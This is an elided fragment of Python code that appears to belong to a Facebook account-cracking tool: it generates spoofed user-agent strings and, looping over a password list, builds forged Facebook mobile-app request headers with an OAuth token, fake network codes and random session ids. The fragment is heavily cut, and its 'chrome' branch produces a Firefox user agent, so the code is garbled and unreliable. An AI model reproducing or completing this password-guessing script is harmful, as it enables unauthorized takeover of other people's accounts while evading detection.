...
def generate_kali_ua():
    ...
    if browser == "chrome":
        ...
        ua = f"Mozilla/5.0 (X11; Linux x86_64; rv:{version}) Gecko/20100101 Firefox/{version}"
    ...
    try:
        for pas in passlist:
            ...
            headers = {
                ...
                "X-FB-Net-HNI": random.choice(["40501", "40585"]),
                "X-FB-SIM-HNI": random.choice(["40501", "40585"]),
                "X-FB-Connection-Type": "WIFI",
                "Authorization": f"OAuth {access_token}",
                "X-Tigon-Is-Retry": "False",
                "x-fb-session-id": str(uuid.uuid4()),
                "x-fb-device-group": "7:0",
